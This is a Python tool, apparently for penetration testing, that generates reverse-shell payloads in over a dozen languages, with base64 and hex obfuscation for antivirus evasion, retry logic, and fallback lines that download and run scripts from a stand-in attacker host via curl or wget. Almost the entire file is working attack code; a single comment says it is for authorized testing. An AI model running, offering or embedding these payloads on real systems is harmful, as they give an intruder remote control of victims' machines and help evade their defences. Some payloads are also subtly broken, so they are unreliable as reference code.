#!/usr/bin/env python3
"""
Enhanced Reverse Shell Generator with AV Evasion
Author: Security Researcher
Usage: python3 resh.py <lhost> <lport> <filename> [options]
"""

import sys
import os
import base64
import random
import string
import argparse
from datetime import datetime

def generate_random_string(length=8):
    """Generate random string for variable names"""
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def obfuscate_payload(payload, method='base64'):
    """Obfuscate payload using various methods"""
    if method == 'base64':
        encoded = base64.b64encode(payload.encode()).decode()
        return f"echo {encoded} | base64 -d | sh"
    elif method == 'hex':
        hex_payload = payload.encode().hex()
        return f"echo {hex_payload} | xxd -r -p | sh"
    elif method == 'rot13':
        rot13 = str.maketrans(
            'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
            'nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM'
        )
        return payload.translate(rot13)
    else:
        return payload

def generate_bash_payload(lhost, lport, obfuscate=False):
    """Generate Bash reverse shell with evasion"""
    payloads = []
    
    # Standard bash
    payloads.append(f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
    
    # Using exec
    payloads.append(f"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5|while read line;do $line 2>&5 >&5;done")
    
    # Using /dev/udp (if available)
    payloads.append(f"sh -i >& /dev/udp/{lhost}/{lport} 0>&1")
    
    # Using named pipes
    payloads.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f")
    
    if obfuscate:
        return obfuscate_payload(random.choice(payloads))
    return random.choice(payloads)

def generate_python_payload(lhost, lport, obfuscate=False):
    """Generate Python reverse shell"""
    python_payload = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])'''
    
    if obfuscate:
        encoded = base64.b64encode(python_payload.encode()).decode()
        return f"python -c 'exec(__import__(\"base64\").b64decode(\"{encoded}\").decode())'"
    return f"python -c '{python_payload}'"

def generate_perl_payload(lhost, lport, obfuscate=False):
    """Generate Perl reverse shell"""
    # FIXED: Proper string termination
    perl_payload = f'''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' '''
    return perl_payload

def generate_php_payload(lhost, lport, obfuscate=False):
    """Generate PHP reverse shell"""
    php_payload = f'''php -r '$sock=fsockopen("{lhost}",{lport});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' '''
    return php_payload

def generate_ruby_payload(lhost, lport, obfuscate=False):
    """Generate Ruby reverse shell"""
    ruby_payload = f'''ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{lhost}",{lport});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end' '''
    return ruby_payload

def generate_nc_payload(lhost, lport, obfuscate=False):
    """Generate Netcat reverse shell"""
    payloads = [
        f"nc -e /bin/sh {lhost} {lport}",
        f"nc -c /bin/sh {lhost} {lport}",
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        f"nc {lhost} {lport} | /bin/sh | nc {lhost} {lport + 1}"
    ]
    return random.choice(payloads)

def generate_socat_payload(lhost, lport):
    """Generate Socat reverse shell"""
    return f"socat TCP:{lhost}:{lport} EXEC:/bin/sh"

def generate_java_payload(lhost, lport):
    """Generate Java reverse shell"""
    return f'''java -cp . revshell {lhost} {lport}'''

def generate_go_payload(lhost, lport):
    """Generate Go reverse shell"""
    go_code = f'''package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'''
    encoded = base64.b64encode(go_code.encode()).decode()
    return f"echo {encoded} | base64 -d > /tmp/go_rev.go && go run /tmp/go_rev.go"

def generate_powershell_payload(lhost, lport, obfuscate=False):
    """Generate PowerShell reverse shell (for Windows targets)"""
    ps_payload = f'''$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
    
    if obfuscate:
        encoded = base64.b64encode(ps_payload.encode('utf-16le')).decode()
        return f"powershell -e {encoded}"
    return f"powershell -c \"{ps_payload}\""

def generate_elaborate_shell(lhost, lport, filename, obfuscate=False, stealth=False):
    """Generate an elaborate reverse shell script with multiple options"""
    
    # Generate random variable names for obfuscation
    var1 = generate_random_string(6)
    var2 = generate_random_string(6)
    var3 = generate_random_string(6)
    
    header = f'''#!/bin/bash
# Auto-generated Reverse Shell Script
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# LHOST: {lhost} | LPORT: {lport}
# Usage: bash {filename} || curl -s http://attacker/{filename} | bash
# Note: For authorized testing only

{var1}="{lhost}"
{var2}={lport}
{var3}=0

# Function to test connectivity
test_conn() {{
    timeout 2 bash -c "echo > /dev/tcp/$1/$2" 2>/dev/null
    return $?
}}

# Try multiple methods with fallback
attempt_reverse_shell() {{
    echo "[*] Attempting reverse shell to $1:$2"
    
'''

    footer = '''
    echo "[-] All reverse shell methods failed"
    echo "[*] Trying alternative techniques..."
    
    # Final fallback - download and execute
    curl -s http://ATTACKER_IP/fallback.sh | bash 2>/dev/null ||
    wget -q -O- http://ATTACKER_IP/fallback.sh | bash 2>/dev/null
    
    exit 1
}

# Main execution with retry logic
for i in {1..3}; do
    echo "[*] Attempt $i/3"
    if test_conn $1 $2; then
        attempt_reverse_shell $1 $2
        sleep 2
    else
        echo "[-] Connection test failed, retrying in 3s..."
        sleep 3
    fi
done

echo "[-] Failed to establish connection after multiple attempts"
exit 1
'''
    
    # Build the methods section
    methods = []
    
    # Add all payload methods
    methods.append(f"    # Method 1: Bash TCP\n    bash -c 'bash -i >& /dev/tcp/${{1}}/${{2}} 0>&1' && return 0\n")
    
    methods.append(f"    # Method 2: Python\n    python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${{1}}',${{2}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i'])\" && return 0\n")
    
    methods.append(f"    # Method 3: Netcat\n    which nc >/dev/null 2>&1 && (nc -e /bin/sh ${{1}} ${{2}} || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${{1}} ${{2}} >/tmp/f) && return 0\n")
    
    methods.append(f"    # Method 4: Perl\n    perl -e 'use Socket;$i=\"${{1}}\";$p=${{2}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};' && return 0\n")
    
    methods.append(f"    # Method 5: PHP\n    php -r '\$sock=fsockopen(\"${{1}}\",${{2}});exec(\"/bin/sh -i <&3 >&3 2>&3\");' && return 0\n")
    
    methods.append(f"    # Method 6: Ruby\n    ruby -rsocket -e'f=TCPSocket.open(\"${{1}}\", ${{2}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' && return 0\n")
    
    methods.append(f"    # Method 7: Socat\n    which socat >/dev/null 2>&1 && socat TCP:${{1}}:${{2}} EXEC:/bin/sh && return 0\n")
    
    methods.append(f"    # Method 8: Awk\n    awk 'BEGIN {{s=\"/inet/tcp/0/${{1}}/${{2}}\";while(1){{do{{printf \"shell>\"|&s; s|&getline c;if(c){{while((c|&getline)>0)print $0|&s;close(c)}}}}while(c!=\"exit\")close(s)}}}}' /dev/null && return 0\n")
    
    methods.append(f"    # Method 9: Telnet\n    rm -f /tmp/p; mknod /tmp/p p && telnet ${{1}} ${{2}} 0</tmp/p | /bin/sh 1>/tmp/p && return 0\n")
    
    methods.append(f"    # Method 10: OpenSSL (encrypted)\n    openssl s_client -quiet -connect ${{1}}:${{2}} 2>/dev/null | /bin/sh | openssl s_client -quiet -connect ${{1}}:${{2}} 2>/dev/null && return 0\n")
    
    # Add obfuscated versions if requested
    if obfuscate:
        methods.append(f"\n    # Obfuscated Bash\n    echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8kMXwkMiAwPiYx' | base64 -d | bash && return 0\n")
    
    if stealth:
        methods.append(f"\n    # Stealth mode (no shell prompt)\n    exec 3<>/dev/tcp/${{1}}/${{2}};while read -r cmd <&3; do eval \"$cmd\" >&3 2>&3; done && return 0\n")
    
    # Combine everything
    methods_section = "".join(methods)
    
    return header + methods_section + footer

def generate_one_liner(lhost, lport, payload_type='bash'):
    """Generate one-liner reverse shell commands"""
    payloads = {
        'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        'bash_udp': f"sh -i >& /dev/udp/{lhost}/{lport} 0>&1",
        'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
        'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'ruby': f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{lhost}\",{lport});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        'nc': f"nc -e /bin/sh {lhost} {lport}",
        'nc_mkfifo': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        'powershell': f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        'powershell_encoded': f"powershell -e {base64.b64encode(f'$client = New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'.encode('utf-16le')).decode()}",
        'awk': f"awk 'BEGIN {{s=\"/inet/tcp/0/{lhost}/{lport}\";while(1){{do{{printf \"shell>\"|&s; s|&getline c;if(c){{while((c|&getline)>0)print $0|&s;close(c)}}}}while(c!=\"exit\")close(s)}}}}' /dev/null",
        'java': f'''echo 'public class RevShell {{ public static void main(String[] args) {{ try {{ String host="{lhost}"; int port={lport}; String cmd="/bin/sh"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()) {{ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try {{ p.exitValue(); break; }} catch (Exception e){{}} }}; p.destroy(); s.close(); }} catch(Exception e) {{}} }} }}' > /tmp/RevShell.java && javac /tmp/RevShell.java && java -cp /tmp RevShell''',
        'lua': f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
        'nodejs': f"node -e \"require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')\"",
        'curl_bash': f"curl -s http://attacker/shell.sh | bash -s {lhost} {lport}",
        'wget_bash': f"wget -q -O- http://attacker/shell.sh | bash -s {lhost} {lport}",
    }
    
    return payloads.get(payload_type, payloads['bash'])

def main():
    parser = argparse.ArgumentParser(
        description='Enhanced Reverse Shell Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s 10.10.10.10 4444 shell.sh
  %(prog)s 192.168.1.100 8080 -o --stealth
  %(prog)s 10.0.0.1 9000 -t python
  %(prog)s --oneliner bash 10.10.10.10 4444
  %(prog)s --oneliner powershell 10.10.10.10 4444
        '''
    )
    
    parser.add_argument('lhost', nargs='?', help='Attacker IP address')
    parser.add_argument('lport', nargs='?', type=int, help='Attacker port')
    parser.add_argument('filename', nargs='?', help='Output filename')
    parser.add_argument('-o', '--obfuscate', action='store_true', help='Obfuscate payload')
    parser.add_argument('-s', '--stealth', action='store_true', help='Stealth mode')
    parser.add_argument('-t', '--type', default='auto', choices=['auto', 'bash', 'python', 'perl', 'php', 'ruby', 'nc', 'powershell', 'all'], help='Payload type')
    parser.add_argument('--oneliner', action='store_true', help='Generate one-liner only')
    parser.add_argument('--list-types', action='store_true', help='List available payload types')
    
    args = parser.parse_args()
    
    if args.list_types:
        print("Available payload types:")
        print("  bash, python, perl, php, ruby, nc, powershell, awk, java, lua, nodejs")
        print("\nOne-liner examples:")
        print("  bash -i >& /dev/tcp/LHOST/LPORT 0>&1")
        print("  python -c 'import socket,subprocess,os;s=socket.socket(...)'")
        return
    
    if not args.lhost or not args.lport:
        parser.print_help()
        print(f"\nUsage: {sys.argv[0]} <lhost> <lport> <filename> [options]")
        print(f"       curl http://attacker/generate.sh?lhost=IP&lport=PORT | bash")
        sys.exit(1)
    
    if args.oneliner:
        if args.type == 'all':
            for ptype in ['bash', 'python', 'perl', 'php', 'ruby', 'nc', 'powershell', 'awk', 'java', 'lua', 'nodejs']:
                print(f"\n[{ptype.upper()}]")
                print(generate_one_liner(args.lhost, args.lport, ptype))
        else:
            print(generate_one_liner(args.lhost, args.lport, args.type))
        return
    
    if not args.filename:
        args.filename = f"revshell_{args.lhost}_{args.lport}.sh"
    
    # Generate the shell script
    if args.type == 'auto' or args.type == 'all':
        shell_content = generate_elaborate_shell(
            args.lhost, 
            args.lport, 
            args.filename, 
            obfuscate=args.obfuscate,
            stealth=args.stealth
        )
    else:
        # Generate specific type
        generators = {
            'bash': lambda: generate_bash_payload(args.lhost, args.lport, args.obfuscate),
            'python': lambda: generate_python_payload(args.lhost, args.lport, args.obfuscate),
            'perl': lambda: generate_perl_payload(args.lhost, args.lport, args.obfuscate),
            'php': lambda: generate_php_payload(args.lhost, args.lport, args.obfuscate),
            'ruby': lambda: generate_ruby_payload(args.lhost, args.lport, args.obfuscate),
            'nc': lambda: generate_nc_payload(args.lhost, args.lport, args.obfuscate),
            'powershell': lambda: generate_powershell_payload(args.lhost, args.lport, args.obfuscate)
        }
        
        shell_content = f'''#!/bin/bash
# {args.type.upper()} Reverse Shell
# LHOST: {args.lhost} | LPORT: {args.lport}

{generators.get(args.type, generators['bash'])()}
'''
    
    try:
        with open(args.filename, 'w') as f:
            f.write(shell_content)
        
        os.chmod(args.filename, 0o755)
        
        print(f"[+] Reverse shell script generated: {args.filename}")
        print(f"[+] LHOST: {args.lhost}")
        print(f"[+] LPORT: {args.lport}")
        print(f"[+] Size: {len(shell_content)} bytes")
        print(f"[+] Usage: bash {args.filename}")
        print(f"[+] Or: curl -s http://attacker/{args.filename} | bash")
        
        # Show preview
        print(f"\n[Preview (first 5 lines)]:")
        for i, line in enumerate(shell_content.split('\n')[:5]):
            print(f"  {line}")
        
        if len(shell_content.split('\n')) > 5:
            print("  ...")
            
    except Exception as e:
        print(f"[-] Error writing file: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
